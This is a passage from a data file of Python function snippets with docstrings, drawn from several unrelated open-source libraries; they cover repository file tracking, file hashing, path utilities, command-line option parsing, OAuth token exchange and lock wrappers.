ntrials>0, \"ntrials must be >0\"\n        repo = None\n        for _trial in range(ntrials):\n            try:\n                self.__load_repository(path=path, verbose=True)\n            except Exception as err1:\n                try:\n                    from .OldRepository import Repository\n                    REP = Repository(path)\n                except Exception as err2:\n                    #traceback.print_exc()\n                    error = \"Unable to load repository using neiher new style (%s) nor old style (%s)\"%(err1, err2)\n                    if self.DEBUG_PRINT_FAILED_TRIALS: print(\"Trial %i failed in Repository.%s (%s). Set Repository.DEBUG_PRINT_FAILED_TRIALS to False to mute\"%(_trial, inspect.stack()[1][3], str(error)))\n                else:\n                    error = None\n                    repo  = REP\n                    break\n            else:\n                error = None\n                repo  = self\n                break\n        # check and return\n        assert error is None, error\n        return repo"
        ],
        [
            "def remove_repository(self, path=None, removeEmptyDirs=True):\n        \"\"\"\n        Remove all repository from path along with all repository tracked files.\n\n        :Parameters:\n            #. path (None, string): The path the repository to remove.\n            #. removeEmptyDirs (boolean): Whether to remove remaining empty\n               directories.\n        \"\"\"\n        assert isinstance(removeEmptyDirs, bool), \"removeEmptyDirs must be boolean\"\n        if path is not None:\n            if path != self.__path:\n                repo = Repository()\n                repo.load_repository(path)\n            else:\n                repo = self\n        else:\n            repo = self\n        assert repo.path is not None, \"path is not given and repository is not initialized\"\n        # remove repo files and directories\n        for fdict in reversed(repo.get_repository_state()):\n            relaPath   = list(fdict)[0]\n            realPath   = os.path.join(repo.path, relaPath)\n            path, name = os.path.split(realPath)\n            if fdict[relaPath]['type'] == 'file':\n                if os.path.isfile(realPath):\n                    os.remove(realPath)\n                if os.path.isfile(os.path.join(repo.path,path,self.__fileInfo%name)):\n                    os.remove(os.path.join(repo.path,path,self.__fileInfo%name))\n                if os.path.isfile(os.path.join(repo.path,path,self.__fileLock%name)):\n                    os.remove(os.path.join(repo.path,path,self.__fileLock%name))\n                if os.path.isfile(os.path.join(repo.path,path,self.__fileClass%name)):\n                    os.remove(os.path.join(repo.path,path,self.__fileClass%name))\n            elif fdict[relaPath]['type'] == 'dir':\n                if os.path.isfile(os.path.join(realPath,self.__dirInfo)):\n                    os.remove(os.path.join(realPath,self.__dirInfo))\n                if os.path.isfile(os.path.join(realPath,self.__dirLock)):\n                    os.remove(os.path.join(realPath,self.__dirLock))\n                if not len(os.listdir(realPath)) and removeEmptyDirs:\n                    shutil.rmtree( realPath )\n        # remove repo information file\n        if os.path.isfile(os.path.join(repo.path,self.__repoFile)):\n            os.remove(os.path.join(repo.path,self.__repoFile))\n        if os.path.isfile(os.path.join(repo.path,self.__repoLock)):\n            os.remove(os.path.join(repo.path,self.__repoLock))"
        ],
        [
            "def is_name_allowed(self, path):\n        \"\"\"\n        Get whether creating a file or a directory from the basenane of the given\n        path is allowed\n\n        :Parameters:\n            #. path (str): The absolute or relative path or simply the file\n               or directory name.\n\n        :Returns:\n            #. allowed (bool): Whether name is allowed.\n            #. message (None, str): Reason for the name to be forbidden.\n        \"\"\"\n        assert isinstance(path, basestring), \"given path must be a string\"\n        name = os.path.basename(path)\n        if not len(name):\n            return False, \"empty name is not allowed\"\n        # exact match\n        for em in [self.__repoLock,self.__repoFile,self.__dirInfo,self.__dirLock]:\n            if name == em:\n                return False, \"name '%s' is reserved for pyrep internal usage\"%em\n        # pattern match\n        for pm in [self.__fileInfo,self.__fileLock]:#,self.__objectDir]:\n            if name == pm or (name.endswith(pm[3:]) and name.startswith('.')):\n                return False, \"name pattern '%s' is not allowed as result may be reserved for pyrep internal usage\"%pm\n        # name is ok\n        return True, None"
        ],
        [
            "def to_repo_relative_path(self, path, split=False):\n        \"\"\"\n        Given a path, return relative path to diretory\n\n        :Parameters:\n            #. path (str): Path as a string\n            #. split (boolean): Whether to split path to its components\n\n        :Returns:\n            #. relativePath (str, list): Relative path as a string or as a list\n               of components if split is True\n        \"\"\"\n        path = os.path.normpath(path)\n        if path == '.':\n            path = ''\n        path = path.split(self.__path)[-1].strip(os.sep)\n        if split:\n            return path.split(os.sep)\n        else:\n            return path"
        ],
        [
            "def get_repository_state(self, relaPath=None):\n        \"\"\"\n        Get a list representation of repository state along with useful\n        information. List state is ordered relativeley to directories level\n\n        :Parameters:\n            #. relaPath (None, str): relative directory path from where to\n               start. If None all repository representation is returned.\n\n        :Returns:\n            #. state (list): List representation of the repository.\n               List items are all dictionaries. Every dictionary has a single\n               key which is the file or the directory name and the value is a\n               dictionary of information including:\n\n                   * 'type': the type of the tracked whether it's file, dir, or objectdir\n                   * 'exists': whether file or directory actually exists on disk\n                   * 'pyrepfileinfo': In case of a file or an objectdir whether .%s_pyrepfileinfo exists\n                   * 'pyrepdirinfo': In case of a directory whether .pyrepdirinfo exists\n        \"\"\"\n        state = []\n        def _walk_dir(relaPath, dirList):\n            dirDict = {'type':'dir',\n                       'exists':os.path.isdir(os.path.join(self.__path,relaPath)),\n                       'pyrepdirinfo':os.path.isfile(os.path.join(self.__path,relaPath,self.__dirInfo)),\n                      }\n            state.append({relaPath:dirDict})\n            # loop files and dirobjects\n            for fname in sorted([f for f in dirList if isinstance(f, basestring)]):\n                relaFilePath = os.path.join(relaPath,fname)\n                realFilePath = os.path.join(self.__path,relaFilePath)\n                #if os.path.isdir(realFilePath) and df.startswith('.') and df.endswith(self.__objectDir[3:]):\n                #    fileDict = {'type':'objectdir',\n                #                'exists':True,\n                #                'pyrepfileinfo':os.path.isfile(os.path.join(self.__path,relaPath,self.__fileInfo%fname)),\n                #               }\n                #else:\n                #    fileDict = {'type':'file',\n                #                'exists':os.path.isfile(realFilePath),\n                #                'pyrepfileinfo':os.path.isfile(os.path.join(self.__path,relaPath,self.__fileInfo%fname)),\n                #               }\n                fileDict = {'type':'file',\n                            'exists':os.path.isfile(realFilePath),\n                            'pyrepfileinfo':os.path.isfile(os.path.join(self.__path,relaPath,self.__fileInfo%fname)),\n                           }\n                state.append({relaFilePath:fileDict})\n            # loop directories\n            #for ddict in sorted([d for d in dirList if isinstance(d, dict) and len(d)], key=lambda k: list(k)[0]):\n            for ddict in sorted([d for d in dirList if isinstance(d, dict)], key=lambda k: list(k)[0]):\n                dirname = list(ddict)[0]\n                _walk_dir(relaPath=os.path.join(relaPath,dirname), dirList=ddict[dirname])\n        # call recursive _walk_dir\n        if relaPath is None:\n            _walk_dir(relaPath='', dirList=self.__repo['walk_repo'])\n        else:\n            assert isinstance(relaPath, basestring), \"relaPath must be None or a str\"\n            relaPath = self.to_repo_relative_path(path=relaPath, split=False)\n            spath    = relaPath.split(os.sep)\n            dirList  = self.__repo['walk_repo']\n            while len(spath):\n                dirname = spath.pop(0)\n                dList   = [d for d in dirList if isinstance(d, dict)]\n                if not len(dList):\n                    dirList = None\n                    break\n                cDict = [d for d in dList if dirname in d]\n                if not len(cDict):\n                    dirList = None\n                    break\n                dirList = cDict[0][dirname]\n            if dirList is not None:\n                _walk_dir(relaPath=relaPath, dirList=dirList)\n        # return state list\n        return state"
        ],
        [
            "def get_file_info(self, relativePath):\n        \"\"\"\n        Get file information dict from the repository given its relative path.\n\n        :Parameters:\n            #. relativePath (string): The relative to the repository path of\n               the file.\n\n        :Returns:\n            #. info (None, dictionary): The file information dictionary.\n               If None, it means an error has occurred.\n            #. errorMessage (string): The error message if any error occurred.\n        \"\"\"\n        relativePath = self.to_repo_relative_path(path=relativePath, split=False)\n        fileName     = os.path.basename(relativePath)\n        isRepoFile,fileOnDisk, infoOnDisk, classOnDisk = self.is_repository_file(relativePath)\n        if not isRepoFile:\n            return None, \"file is not a registered repository file.\"\n        if not infoOnDisk:\n            return None, \"file is a registered repository file but info file missing\"\n        fileInfoPath = os.path.join(self.__path,os.path.dirname(relativePath),self.__fileInfo%fileName)\n        try:\n            with open(fileInfoPath, 'rb') as fd:\n                info = pickle.load(fd)\n        except Exception as err:\n            return None, \"Unable to read file info from disk (%s)\"%str(err)\n        return info, ''"
        ],
        [
            "def is_repository_file(self, relativePath):\n        \"\"\"\n        Check whether a given relative path is a repository file path\n\n        :Parameters:\n            #. relativePath (string): File relative path\n\n        :Returns:\n            #. isRepoFile (boolean): Whether file is a repository file.\n            #. isFileOnDisk (boolean): Whether file is found on disk.\n            #. isFileInfoOnDisk (boolean): Whether file info is found on disk.\n            #. isFileClassOnDisk (boolean): Whether file class is found on disk.\n        \"\"\"\n        relativePath  = self.to_repo_relative_path(path=relativePath, split=False)\n        if relativePath == '':\n            return False, False, False, False\n        relaDir, name = os.path.split(relativePath)\n        fileOnDisk    = os.path.isfile(os.path.join(self.__path, relativePath))\n        infoOnDisk    = os.path.isfile(os.path.join(self.__path,os.path.dirname(relativePath),self.__fileInfo%name))\n        classOnDisk   = os.path.isfile(os.path.join(self.__path,os.path.dirname(relativePath),self.__fileClass%name))\n        cDir          = self.__repo['walk_repo']\n        if len(relaDir):\n            for dirname in relaDir.split(os.sep):\n                dList = [d for d in cDir if isinstance(d, dict)]\n                if not len(dList):\n                    cDir = None\n                    break\n                cDict = [d for d in dList if dirname in d]\n                if not len(cDict):\n                    cDir = None\n                    break\n                cDir = cDict[0][dirname]\n        if cDir is None:\n            return False, fileOnDisk, infoOnDisk, classOnDisk\n        #if name not in cDir:\n        if str(name) not in [str(i) for i in cDir]:\n            return False, fileOnDisk, infoOnDisk, classOnDisk\n        # this is a repository registered file. check whether all is on disk\n        return True, fileOnDisk, infoOnDisk, classOnDisk"
        ],
        [
            "def create_package(self, path=None, name=None, mode=None):\n        \"\"\"\n        Create a tar file package of all the repository files and directories.\n        Only files and directories that are tracked in the repository\n        are stored in the package tar file.\n\n        **N.B. On some systems packaging requires root permissions.**\n\n        :Parameters:\n            #. path (None, string): The real absolute path where to create the\n               package. If None, it will be created in the same directory as\n               the repository. If '.' or an empty string is passed, the current\n               working directory will be used.\n            #. name (None, string): The name to give to the package file\n               If None, the package directory name will be used with the\n               appropriate extension added.\n            #. mode (None, string): The writing mode of the tarfile.\n               If None, automatically the best compression mode will be chose.\n               Available modes are ('w', 'w:', 'w:gz', 'w:bz2')\n        \"\"\"\n        # check mode\n        assert mode in (None, 'w', 'w:', 'w:gz', 'w:bz2'), 'unkown archive mode %s'%str(mode)\n        if mode is None:\n            #mode = 'w:bz2'\n            mode = 'w:'\n        # get root\n        if path is None:\n            root = os.path.split(self.__path)[0]\n        elif path.strip() in ('','.'):\n            root = os.getcwd()\n        else:\n            root = os.path.realpath( os.path.expanduser(path) )\n        assert os.path.isdir(root), 'absolute path %s is not a valid directory'%path\n        # get name\n        if name is None:\n            ext = mode.split(\":\")\n            if len(ext) == 2:\n                if len(ext[1]):\n                    ext = \".\"+ext[1]\n                else:\n                    ext = '.tar'\n            else:\n                ext = '.tar'\n            name = os.path.split(self.__path)[1]+ext\n        # create tar file\n        tarfilePath = os.path.join(root, name)\n        try:\n            tarHandler = tarfile.TarFile.open(tarfilePath, mode=mode)\n        except Exception as e:\n            raise Exception(\"Unable to create package (%s)\"%e)\n        # walk directory and create empty directories\n        for dpath in sorted(list(self.walk_directories_path(recursive=True))):\n            t = tarfile.TarInfo( dpath )\n            t.type = tarfile.DIRTYPE\n            tarHandler.addfile(t)\n            tarHandler.add(os.path.join(self.__path,dpath,self.__dirInfo), arcname=self.__dirInfo)\n        # walk files and add to tar\n        for fpath in self.walk_files_path(recursive=True):\n            relaPath, fname = os.path.split(fpath)\n            tarHandler.add(os.path.join(self.__path,fpath), arcname=fname)\n            tarHandler.add(os.path.join(self.__path,relaPath,self.__fileInfo%fname), arcname=self.__fileInfo%fname)\n            tarHandler.add(os.path.join(self.__path,relaPath,self.__fileClass%fname), arcname=self.__fileClass%fname)\n        # save repository .pyrepinfo\n        tarHandler.add(os.path.join(self.__path,self.__repoFile), arcname=\".pyrepinfo\")\n        # close tar file\n        tarHandler.close()"
        ],
        [
            "def rename(self, key: Any, new_key: Any):\n        \"\"\"\n        Renames an item in this collection as a transaction.\n\n        Will override if new key name already exists.\n        :param key: the current name of the item\n        :param new_key: the new name that the item should have\n        \"\"\"\n        if new_key == key:\n            return\n\n        required_locks = [self._key_locks[key], self._key_locks[new_key]]\n        ordered_required_locks = sorted(required_locks, key=lambda x: id(x))\n        for lock in ordered_required_locks:\n            lock.acquire()\n\n        try:\n            if key not in self._data:\n                raise KeyError(\"Attribute to rename \\\"%s\\\" does not exist\" % key)\n            self._data[new_key] = self[key]\n            del self._data[key]\n        finally:\n            for lock in required_locks:\n                lock.release()"
        ],
        [
            "def get_text_fingerprint(text, hash_meth, encoding=\"utf-8\"):  # pragma: no cover\n    \"\"\"\n    Use default hash method to return hash value of a piece of string\n    default setting use 'utf-8' encoding.\n    \"\"\"\n    m = hash_meth()\n    m.update(text.encode(encoding))\n    return m.hexdigest()"
        ],
        [
            "def md5file(abspath, nbytes=0, chunk_size=DEFAULT_CHUNK_SIZE):\n    \"\"\"\n    Return md5 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n\n    CPU = i7-4600U 2.10GHz - 2.70GHz, RAM = 8.00 GB\n    1 second can process 0.25GB data\n\n    - 0.59G - 2.43 sec\n    - 1.3G - 5.68 sec\n    - 1.9G - 7.72 sec\n    - 2.5G - 10.32 sec\n    - 3.9G - 16.0 sec\n    \"\"\"\n    return get_file_fingerprint(abspath, hashlib.md5, nbytes=nbytes, chunk_size=chunk_size)"
        ],
        [
            "def sha256file(abspath, nbytes=0, chunk_size=DEFAULT_CHUNK_SIZE):\n    \"\"\"\n    Return sha256 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n    \"\"\"\n    return get_file_fingerprint(abspath, hashlib.sha256, nbytes=nbytes, chunk_size=chunk_size)"
        ],
        [
            "def sha512file(abspath, nbytes=0, chunk_size=DEFAULT_CHUNK_SIZE):\n    \"\"\"\n    Return sha512 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n    \"\"\"\n    return get_file_fingerprint(abspath, hashlib.sha512, nbytes=nbytes, chunk_size=chunk_size)"
        ],
        [
            "def auto_complete_choices(self, case_sensitive=False):\n        \"\"\"\n        A command line auto complete similar behavior. Find all item with same\n        prefix of this one.\n\n        :param case_sensitive: toggle if it is case sensitive.\n        :return: list of :class:`pathlib_mate.pathlib2.Path`.\n        \"\"\"\n        self_basename = self.basename\n        self_basename_lower = self.basename.lower()\n        if case_sensitive:  # pragma: no cover\n            def match(basename):\n                return basename.startswith(self_basename)\n        else:\n            def match(basename):\n                return basename.lower().startswith(self_basename_lower)\n\n        choices = list()\n        if self.is_dir():\n            choices.append(self)\n            for p in self.sort_by_abspath(self.select(recursive=False)):\n                choices.append(p)\n        else:\n            p_parent = self.parent\n            if p_parent.is_dir():\n                for p in self.sort_by_abspath(p_parent.select(recursive=False)):\n                    if match(p.basename):\n                        choices.append(p)\n            else:  # pragma: no cover\n                raise ValueError(\"'%s' directory does not exist!\" % p_parent)\n        return choices"
        ],
        [
            "def print_big_dir(self, top_n=5):\n        \"\"\"\n        Print ``top_n`` big dir in this dir.\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        size_table = sorted(\n            [(p, p.dirsize) for p in self.select_dir(recursive=False)],\n            key=lambda x: x[1],\n            reverse=True,\n        )\n        for p, size in size_table[:top_n]:\n            print(\"{:<9}    {:<9}\".format(repr_data_size(size), p.abspath))"
        ],
        [
            "def print_big_file(self, top_n=5):\n        \"\"\"\n        Print ``top_n`` big file in this dir.\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        size_table = sorted(\n            [(p, p.size) for p in self.select_file(recursive=True)],\n            key=lambda x: x[1],\n            reverse=True,\n        )\n        for p, size in size_table[:top_n]:\n            print(\"{:<9}    {:<9}\".format(repr_data_size(size), p.abspath))"
        ],
        [
            "def print_big_dir_and_big_file(self, top_n=5):\n        \"\"\"Print ``top_n`` big dir and ``top_n`` big file in each dir.\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        size_table1 = sorted(\n            [(p, p.dirsize) for p in self.select_dir(recursive=False)],\n            key=lambda x: x[1],\n            reverse=True,\n        )\n        for p1, size1 in size_table1[:top_n]:\n            print(\"{:<9}    {:<9}\".format(repr_data_size(size1), p1.abspath))\n            size_table2 = sorted(\n                [(p, p.size) for p in p1.select_file(recursive=True)],\n                key=lambda x: x[1],\n                reverse=True,\n            )\n            for p2, size2 in size_table2[:top_n]:\n                print(\"    {:<9}    {:<9}\".format(\n                    repr_data_size(size2), p2.abspath))"
        ],
        [
            "def mirror_to(self, dst):  # pragma: no cover\n        \"\"\"\n        Create a new folder having exactly same structure with this directory.\n        However, all files are just empty file with same file name.\n\n        :param dst: destination directory. The directory can't exists before\n        you execute this.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\u7684\u955c\u50cf\u62f7\u8d1d, \u4e0e\u62f7\u8d1d\u64cd\u4f5c\u4e0d\u540c\u7684\u662f, \u6587\u4ef6\u7684\u526f\u672c\u53ea\u662f\u5728\u6587\u4ef6\u540d\u4e0a\n        \u4e0e\u539f\u4ef6\u4e00\u81f4, \u4f46\u662f\u662f\u7a7a\u6587\u4ef6, \u5b8c\u5168\u6ca1\u6709\u5185\u5bb9, \u6587\u4ef6\u5927\u5c0f\u4e3a0\u3002\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        src = self.abspath\n        dst = os.path.abspath(dst)\n        if os.path.exists(dst):  # pragma: no cover\n            raise Exception(\"distination already exist!\")\n\n        folder_to_create = list()\n        file_to_create = list()\n\n        for current_folder, _, file_list in os.walk(self.abspath):\n            current_folder = current_folder.replace(src, dst)\n            try:\n                os.mkdir(current_folder)\n            except:  # pragma: no cover\n                pass\n            for basename in file_list:\n                abspath = os.path.join(current_folder, basename)\n                with open(abspath, \"wb\") as _:\n                    pass"
        ],
        [
            "def execute_pyfile(self, py_exe=None):  # pragma: no cover\n        \"\"\"\n        Execute every ``.py`` file as main script.\n\n        :param py_exe: str, python command or python executable path.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709Python\u6587\u4ef6\u4f5c\u4e3a\u4e3b\u811a\u672c\u7528\u5f53\u524d\u89e3\u91ca\u5668\u8fd0\u884c\u3002\n        \"\"\"\n        import subprocess\n\n        self.assert_is_dir_and_exists()\n\n        if py_exe is None:\n            if six.PY2:\n                py_exe = \"python2\"\n            elif six.PY3:\n                py_exe = \"python3\"\n\n        for p in self.select_by_ext(\".py\"):\n            subprocess.Popen('%s \"%s\"' % (py_exe, p.abspath))"
        ],
        [
            "def trail_space(self, filters=lambda p: p.ext == \".py\"):  # pragma: no cover\n        \"\"\"\n        Trail white space at end of each line for every ``.py`` file.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u88ab\u9009\u62e9\u7684\u6587\u4ef6\u4e2d\u884c\u672b\u7684\u7a7a\u683c\u5220\u9664\u3002\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        for p in self.select_file(filters):\n            try:\n                with open(p.abspath, \"rb\") as f:\n                    lines = list()\n                    for line in f:\n                        lines.append(line.decode(\"utf-8\").rstrip())\n\n                with open(p.abspath, \"wb\") as f:\n                    f.write(\"\\n\".join(lines).encode(\"utf-8\"))\n\n            except Exception as e:  # pragma: no cover\n                raise e"
        ],
        [
            "def autopep8(self, **kwargs):  # pragma: no cover\n        \"\"\"\n        Auto convert your python code in a directory to pep8 styled code.\n\n        :param kwargs: arguments for ``autopep8.fix_code`` method.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709Python\u6587\u4ef6\u7528pep8\u98ce\u683c\u683c\u5f0f\u5316\u3002\u589e\u52a0\u5176\u53ef\u8bfb\u6027\u548c\u89c4\u8303\u6027\u3002\n        \"\"\"\n        self.assert_is_dir_and_exists()\n\n        for p in self.select_by_ext(\".py\"):\n            with open(p.abspath, \"rb\") as f:\n                code = f.read().decode(\"utf-8\")\n\n            formatted_code = autopep8.fix_code(code, **kwargs)\n\n            with open(p.abspath, \"wb\") as f:\n                f.write(formatted_code.encode(\"utf-8\"))"
        ],
        [
            "def size(self):\n        \"\"\"\n        File size in bytes.\n        \"\"\"\n        try:\n            return self._stat.st_size\n        except:  # pragma: no cover\n            self._stat = self.stat()\n            return self.size"
        ],
        [
            "def mtime(self):\n        \"\"\"\n        Get most recent modify time in timestamp.\n        \"\"\"\n        try:\n            return self._stat.st_mtime\n        except:  # pragma: no cover\n            self._stat = self.stat()\n            return self.mtime"
        ],
        [
            "def atime(self):\n        \"\"\"\n        Get most recent access time in timestamp.\n        \"\"\"\n        try:\n            return self._stat.st_atime\n        except:  # pragma: no cover\n            self._stat = self.stat()\n            return self.atime"
        ],
        [
            "def ctime(self):\n        \"\"\"\n        Get most recent create time in timestamp.\n        \"\"\"\n        try:\n            return self._stat.st_ctime\n        except:  # pragma: no cover\n            self._stat = self.stat()\n            return self.ctime"
        ],
        [
            "def unusedoptions(self, sections):\n        \"\"\"Lists options that have not been used to format other values in \n        their sections. \n        \n        Good for finding out if the user has misspelled any of the options.\n        \"\"\"\n        unused = set([])\n        for section in _list(sections):\n            if not self.has_section(section):\n                continue\n            options = self.options(section)\n            raw_values = [self.get(section, option, raw=True) for option in options]\n            for option in options:\n                formatter = \"%(\" + option + \")s\"\n                for raw_value in raw_values:\n                    if formatter in raw_value:\n                        break\n                else:\n                    unused.add(option) \n            return list(unused)"
        ],
        [
            "def keys(self):\n        \"\"\"List names of options and positional arguments.\"\"\"\n        return self.options.keys() + [p.name for p in self.positional_args]"
        ],
        [
            "def _add_option(self, option):\n        \"\"\"Add an Option object to the user interface.\"\"\"\n        if option.name in self.options:\n            raise ValueError('name already in use')\n        if option.abbreviation in self.abbreviations:\n            raise ValueError('abbreviation already in use')\n        if option.name in [arg.name for arg in self.positional_args]:\n            raise ValueError('name already in use by a positional argument')\n        self.options[option.name] = option\n        if option.abbreviation:\n            self.abbreviations[option.abbreviation] = option\n        self.option_order.append(option.name)"
        ],
        [
            "def _add_positional_argument(self, posarg):\n        \"\"\"Append a positional argument to the user interface.\n\n        Optional positional arguments must be added after the required ones. \n        The user interface can have at most one recurring positional argument, \n        and if present, that argument must be the last one.\n        \"\"\"\n        if self.positional_args:\n            if self.positional_args[-1].recurring:\n                raise ValueError(\"recurring positional arguments must be last\")\n            if self.positional_args[-1].optional and not posarg.optional:\n                raise ValueError(\"required positional arguments must precede optional ones\")\n        self.positional_args.append(posarg)"
        ],
        [
            "def read_docs(self, docsfiles):\n        \"\"\"Read program documentation from a DocParser compatible file.\n\n        docsfiles is a list of paths to potential docsfiles: parse if present.\n        A string is taken as a list of one item.\n        \"\"\"\n        updates = DocParser()\n        for docsfile in _list(docsfiles):\n            if os.path.isfile(docsfile):\n                updates.parse(docsfile)\n        self.docs.update((k, _docs(updates[k], self.docvars)) for k in self.docs if updates.blocks[k])\n        for name, text in updates['parameters'].items():\n            if name in self:\n                self.getparam(name).docs = text[0] % self.docvars\n            elif name not in self.ignore:\n                raise ValueError(\"parameter %r does not exist\" % name)"
        ],
        [
            "def optionhelp(self, indent=0, maxindent=25, width=79):\n        \"\"\"Return user friendly help on program options.\"\"\"\n        def makelabels(option):\n            labels = '%*s--%s' % (indent, ' ', option.name)\n            if option.abbreviation:\n                labels += ', -' + option.abbreviation\n            return labels + ': '\n        docs = []\n        helpindent = _autoindent([makelabels(o) for o in self.options.values()], indent, maxindent)\n        for name in self.option_order:\n            option = self.options[name]\n            labels = makelabels(option)\n            helpstring = \"%s(%s). %s\" % (option.formatname, option.strvalue, option.docs)\n            wrapped = self._wrap_labelled(labels, helpstring, helpindent, width)\n            docs.extend(wrapped)\n        return '\\n'.join(docs)"
        ],
        [
            "def posarghelp(self, indent=0, maxindent=25, width=79):\n        \"\"\"Return user friendly help on positional arguments in the program.\"\"\"\n        docs = []\n        makelabel = lambda posarg: ' ' * indent + posarg.displayname + ': '\n        helpindent = _autoindent([makelabel(p) for p in self.positional_args], indent, maxindent)\n        for posarg in self.positional_args:\n            label = makelabel(posarg)\n            text = posarg.formatname + '. ' + posarg.docs\n            wrapped = self._wrap_labelled(label, text, helpindent, width)\n            docs.extend(wrapped)\n        return '\\n'.join(docs)"
        ],
        [
            "def strsettings(self, indent=0, maxindent=25, width=0):\n        \"\"\"Return user friendly help on positional arguments.        \n\n        indent is the number of spaces preceeding the text on each line. \n        \n        The indent of the documentation is dependent on the length of the \n        longest label that is shorter than maxindent. A label longer than \n        maxindent will be printed on its own line.\n        \n        width is maximum allowed page width, use self.width if 0.\n        \"\"\"\n        out = []\n        makelabel = lambda name: ' ' * indent + name + ': '\n        settingsindent = _autoindent([makelabel(s) for s in self.options], indent, maxindent)\n        for name in self.option_order:\n            option = self.options[name]\n            label = makelabel(name)\n            settingshelp = \"%s(%s): %s\" % (option.formatname, option.strvalue, option.location)\n            wrapped = self._wrap_labelled(label, settingshelp, settingsindent, width)\n            out.extend(wrapped)\n        return '\\n'.join(out)"
        ],
        [
            "def settingshelp(self, width=0):\n        \"\"\"Return a summary of program options, their values and origins.\n        \n        width is maximum allowed page width, use self.width if 0.\n        \"\"\"\n        out = []\n        out.append(self._wrap(self.docs['title'], width=width))\n        if self.docs['description']:\n            out.append(self._wrap(self.docs['description'], indent=2, width=width))\n        out.append('')\n        out.append('SETTINGS:')\n        out.append(self.strsettings(indent=2, width=width))\n        out.append('')\n        return '\\n'.join(out)"
        ],
        [
            "def parse(self, file):\n        \"\"\"Parse text blocks from a file.\"\"\"\n        if isinstance(file, basestring):\n            file = open(file)\n        line_number = 0\n        label = None\n        block = self.untagged\n        for line in file:\n            line_number += 1\n            line = line.rstrip('\\n')\n            if self.tabsize > 0:\n                line = line.replace('\\t', ' ' * self.tabsize)\n            if self.decommenter:\n                line = self.decommenter.decomment(line)\n                if line is None:\n                    continue\n            tag = line.split(':', 1)[0].strip()\n            # Still in the same block?\n            if tag not in self.names:\n                if block is None:\n                    if line and not line.isspace():\n                        raise ParseError(file.name, line, \"garbage before first block: %r\" % line)\n                    continue\n                block.addline(line)\n                continue\n            # Open a new block.\n            name = self.names[tag]\n            label = line.split(':',1)[1].strip()\n            if name in self.labelled_classes:\n                if not label:\n                    raise ParseError(file.name, line, \"missing label for %r block\" % name)\n                block = self.blocks[name].setdefault(label, self.labelled_classes[name]())\n            else:\n                if label:\n                    msg = \"label %r present for unlabelled block %r\" % (label, name)\n                    raise ParseError(file.name, line_number, msg)\n                block = self.blocks[name]\n            block.startblock()"
        ],
        [
            "def parse(self, argv):\n        \"\"\"Pop, parse and return the first self.nargs items from args.\n\n        if self.nargs > 1 a list of parsed values will be returned.\n        \n        Raise BadNumberOfArguments or BadArgument on errors.\n         \n        NOTE: argv may be modified in place by this method.\n        \"\"\"\n        if len(argv) < self.nargs:\n            raise BadNumberOfArguments(self.nargs, len(argv))\n        if self.nargs == 1:\n            return self.parse_argument(argv.pop(0))\n        return [self.parse_argument(argv.pop(0)) for tmp in range(self.nargs)]"
        ],
        [
            "def parsestr(self, argstr):\n        \"\"\"Parse arguments found in settings files.\n        \n        Use the values in self.true for True in settings files, or those in \n        self.false for False, case insensitive.\n        \"\"\"\n        argv = shlex.split(argstr, comments=True)\n        if len(argv) != 1:\n            raise BadNumberOfArguments(1, len(argv))\n        arg = argv[0]\n        lower = arg.lower()\n        if lower in self.true:\n            return True\n        if lower in self.false:\n            return False\n        raise BadArgument(arg, \"Allowed values are \" + self.allowed + '.')"
        ],
        [
            "def get_separator(self, i):\n        \"\"\"Return the separator that preceding format i, or '' for i == 0.\"\"\"\n        return i and self.separator[min(i - 1, len(self.separator) - 1)] or ''"
        ],
        [
            "def authorize_url(self):\n        \"\"\"\n        Return a URL to redirect the user to for OAuth authentication.\n        \"\"\"\n        auth_url = OAUTH_ROOT + '/authorize'\n        params = {\n            'client_id': self.client_id,\n            'redirect_uri': self.redirect_uri,\n        }\n        return \"{}?{}\".format(auth_url, urlencode(params))"
        ],
        [
            "def exchange_token(self, code):\n        \"\"\"\n        Exchange the authorization code for an access token.\n        \"\"\"\n        access_token_url = OAUTH_ROOT + '/access_token'\n        params = {\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'redirect_uri': self.redirect_uri,\n            'code': code,\n        }\n        resp = requests.get(access_token_url, params=params)\n        if not resp.ok:\n            raise MixcloudOauthError(\"Could not get access token.\")\n        return resp.json()['access_token']"
        ],
        [
            "def acquire(self, *args, **kwargs):\n        \"\"\" Wraps Lock.acquire \"\"\"\n        with self._stat_lock:\n            self._waiting += 1\n\n        self._lock.acquire(*args, **kwargs)\n\n        with self._stat_lock:\n            self._locked = True\n            self._waiting -= 1"
        ],
        [
            "def release(self):\n        \"\"\" Wraps Lock.release \"\"\"\n        self._lock.release()\n\n        with self._stat_lock:\n            self._locked = False\n            self._last_released = datetime.now()"
        ],
        [
            "def default_decoder(self, obj):\n        \"\"\"Handle a dict that might contain a wrapped state for a custom type.\"\"\"\n        typename, marshalled_state = self.unwrap_callback(obj)\n        if typename is None:\n            return obj\n\n        try:\n            cls, unmarshaller = self.serializer.unmarshallers[typename]\n        except KeyError:\n            raise LookupError('no unmarshaller found for type \"{}\"'.format(typename)) from None\n\n        if cls is not None:\n            instance = cls.__new__(cls)\n            unmarshaller(instance, marshalled_state)\n            return instance\n        else:\n            return unmarshaller(marshalled_state)"
        ],
        [
